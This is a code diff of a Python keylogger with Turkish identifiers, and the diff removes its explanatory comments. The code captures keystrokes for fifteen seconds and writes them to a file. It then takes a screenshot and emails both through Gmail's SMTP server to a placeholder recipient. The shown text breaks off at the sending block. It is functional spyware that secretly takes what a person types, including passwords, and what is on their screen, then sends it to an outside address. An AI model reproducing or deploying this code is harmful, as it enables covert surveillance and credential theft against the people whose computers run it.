@@ -19,39 +19,39 @@ def emir(harfler):
         else:
             toplama += harfler.char
     except AttributeError:
-        # Handle special keys that do not have a char attribute
+        
         pass
 
-# Start listening to keyboard inputs
+
 dinleme = pynput.keyboard.Listener(on_press=emir)
 dinleme.start()
 
-# Listen for 15 seconds
+
 time.sleep(15)
 dinleme.stop()
 
-# Save the captured keystrokes to a file
+
 with open("klavye.txt", "w", encoding="utf-8") as dosya:
     dosya.write(toplama)
 
-# Email credentials and recipient
+
 smtp_server = 'smtp.gmail.com'
 port = 587
 sender_email = 'Gondericiposta@gmail.com'
 password = 'sifre'
 recipient_email = 'Alıcıposta@gmail.com'
 
-# Create the email message
+
 message = MIMEMultipart()
 message['Subject'] = 'Test E-Postası'
 message['From'] = sender_email
 message['To'] = recipient_email
 
-# Attach the text part
+
 text = MIMEText(toplama)
 message.attach(text)
 
-# Take a screenshot and attach it
+
 screenshot = pyautogui.screenshot()
 screenshot_path = "screenshot.png"
 screenshot.save(screenshot_path)
@@ -60,7 +60,7 @@ with open(screenshot_path, "rb") as image_file:
     image = MIMEImage(image_file.read())
     message.attach(image)
 
-# Send the email
+
 try:
     with smtplib.SMTP(smtp_server, port) as server:
         server.starttls()
